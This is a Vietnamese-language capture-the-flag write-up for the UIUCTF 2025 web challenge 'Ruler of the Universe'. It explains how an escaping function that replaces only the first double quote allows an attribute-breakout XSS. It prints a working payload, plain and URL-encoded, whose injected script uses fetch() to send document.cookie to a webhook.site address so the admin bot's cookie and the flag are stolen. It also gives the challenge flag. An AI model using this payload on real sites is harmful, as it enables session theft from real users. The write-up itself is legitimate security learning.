## UIUCTF2025

End: July 26, 2025
Start: July 28, 2025
Files & media: ![UIUCTF.webp](/assets/img/posts/UIUCTF2025/UIUCTF.webp)
URL: https://ctfd-2025.uiuc.tf/

## I. Ruler of the Universe

Khi ta mở sẽ thấy được giao diện như bên dưới

![image.png](/assets/img/posts/UIUCTF2025/image.png)

ngoài ra còn một trang `Admin Bot` 

![image1.png](/assets/img/posts/UIUCTF2025/image1.png)

thì cũng phần nào đoán được bài lab này liên quan đến chủ đề `XSS Injection` 

kiểm tra source code ta thấy một đoạn code khả nghi sau

```html
            <input
              id="message"
              name="message"
              type="text"
              class="w-full border border-green-400 bg-black text-green-400 px-2 py-1 text-xs"
              placeholder={
                crewMessage
                  ? `Update your message: ${crewMessage}`
                  : "Enter a message for the crew"
              }
            />
```

Ở đây, `crewMessage` được đưa vào làm giá trị cho một **thuộc tính (prop/attribute)**. Ngoài ra cũng còn có một đoạn code phòng chống XSS nhưng chưa đủ chắc chắn như sau

```tsx
  const propString = props
    ? Object.entries(props)
        .filter(([key]) => key !== "children")
        .map(([key, value]) => {
          if (typeof value === "boolean") {
            return value ? key : "";
          }
          return `${key}="${String(value).replace('"', "&quot;")}"`;
        })
        .filter(Boolean)
        .join(" ")
    : "";
```

đoạn code trên chỉ thay thế dấu `"` đầu tiên bằng `&quot;` nên ta vẫn có thể dễ dàng vượt qua nó

và ta sẽ khai thác lỗ hổng trên bằng payload như sau:  `" placeholder="Hello"><script>fetch('[https://webhook.site/fbdbb9e3-5a91-4964-83de-9b97f9a23bb4?flag=](https://webhook.site/fbdbb9e3-5a91-4964-83de-9b97f9a23bb4?flag=)' + document.cookie)</script>`
nhập payload vào phần `Crew Message:` trên trang web và kiểm tra

![image2.png](/assets/img/posts/UIUCTF2025/image2.png)

ta thấy đã thành công tiêm thẻ `script` vào trang web 

và việc cuối cùng ta phải làm là gửi trang web đã bị XSS này đến với `Adminbot` để lấy flag thôi

`url_part` gửi đến adminbot `module/1?message="+placeholder%3D"Hello"><script>fetch%28%27https%3A%2F%2Fwebhook.site%2Ffbdbb9e3-5a91-4964-83de-9b97f9a23bb4%3Fflag%3D%27+%2B+document.cookie%29<%2Fscript>`

> flag : uiuctf{maybe_i_should_just_use_react_c49b79}{: .prompt-tip }

## Sẽ cập nhập thêm trong thời gian tới…